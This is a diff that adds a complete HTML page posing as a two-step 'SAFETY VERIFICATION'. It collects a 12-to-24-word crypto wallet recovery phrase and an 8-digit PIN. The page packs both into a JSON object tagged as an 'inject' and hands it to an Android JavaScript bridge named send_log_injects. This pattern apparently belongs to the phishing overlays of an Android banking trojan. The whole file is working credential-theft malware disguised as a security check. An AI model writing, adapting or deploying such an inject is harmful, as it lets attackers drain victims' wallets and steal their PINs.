@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <title>Document</title>
+    <style>
+        html{height: 100%;}
+        body {
+            background: rgb(3,3,3);
+            background: linear-gradient(180deg, rgba(3,3,3,1) 0%, rgba(38,42,50,1) 100%);
+            background-repeat: no-repeat;
+            color: #fff;
+            padding: 10px;
+        }
+        header {
+            font-size: 20px;
+        }
+
+        p {
+            text-align: center;
+            font-size: 22px;
+            margin-top: 15px;
+            margin-bottom: 0;
+        }
+
+        .input {
+            width: 100%;
+            border: 1px solid #20242a;
+            background: transparent;
+            padding: 10px;
+            height: 100px;
+            text-align: center;
+            color: #fff;
+            margin-bottom: 40px;
+        }
+
+        .pin {
+            height: auto;
+            text-align: center;
+        }
+
+        .submit {
+            padding: 5px 30px;
+            color: #fff;
+            background: #1c3d5c;
+            border: 1px solid #386691;
+            border-radius: 3px;
+            font-size: 18px;
+            font-weight: 600;
+            float: right;
+        }
+
+        .submit:disabled {
+            background: #444444;
+            border-color: #747474;
+            color: #747474;
+        }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <div class="loader__" id="spinner" style="display: none;position:fixed;top:0px;left:0px;width:100%;height:100%;text-align:center;background:rgba(255, 255, 255, 0.47);z-index:8000000;">
+            <span class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color:#20242a"></span>
+        </div>
+        <div id="form1">
+            <header>
+                SAFETY VERIFICATION
+                <span style="float:right">Step 1</span>
+            </header>
+            <p>Enter Word List</p>
+            <span style="display: block;text-align: center;font-size: 14px;color: #ccc;margin-bottom: 30px;">enter 12 - 18 or 24 words.</span>
+
+            <input type="text" class="input" id="words" onkeyup="check();" name="words" autofocus>
+
+            <input type="submit" class="submit" id="nextPage" disabled value="Next">
+        </div>
+        <div id="form2" style="display: none;">
+            <header>
+                SAFETY VERIFICATION
+                <span style="float:right">Step 2</span>
+            </header>
+            <p style="margin-bottom: 30px;">Enter Your 8 Digit PIN</p>
+
+            <input type="password" class="input pin" id="pin" onkeyup="checkPin()" maxlength="8" pattern="^[0-9]{8,8}$" name="pin" autofocus>
+
+            <input type="hidden" name="exit">
+
+            <input type="submit" class="submit" id="sendData" disabled value="Confirm">
+        </div>
+    </form>
+    <script>
+
+        
+        $('#pin').mask('00000000');
+        var words = document.getElementById('words'),
+            pin = document.getElementById('pin'),
+            nextPage = document.getElementById('nextPage'),
+            sendData = document.getElementById('sendData'),
+            form1 = document.getElementById('form1'),
+            form2 = document.getElementById('form2'),
+            spinner = document.getElementById('spinner');
+
+        function check(){
+            if( words.value.split(/[\s\.\?]+/).length === 12 || words.value.split(/[\s\.\?]+/).length === 18 || words.value.split(/[\s\.\?]+/).length === 24){
+                nextPage.disabled = false
+            } else {
+                nextPage.disabled = true
+            }
+        }
+
+        nextPage.onclick = function(){
+            spinner.style.display = 'block'
+            setTimeout(function(){
+                spinner.style.display = 'none'
+                form1.style.display = 'none'
+                form2.style.display = 'block'
+            },2000)
+            return false
+        }
+
+        function checkPin(){
+            if( pin.value.length === 8){
+                sendData.disabled = false
+            } else {
+                sendData.disabled = true
+            }return false
+        }
+
+        sendData.onclick = function(){
+            var data = {};
+                data.words = words.value;
+                data.pin = pin.value;
+                data.type_injects = "crypt";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+    </script>
+</body>
+</html>
